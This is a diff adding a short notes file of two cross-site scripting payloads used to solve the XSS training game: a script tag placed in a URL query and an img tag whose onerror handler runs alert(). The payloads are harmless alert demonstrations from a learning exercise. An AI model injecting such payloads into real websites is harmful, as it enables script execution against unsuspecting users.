@@ -1,0 +1,5 @@
+first attack:
+https://xss-game.appspot.com/level1/frame?query=<script>alert()</script>
+
+second attack:
+<img src="wrong_cheming" onerror="alert()">
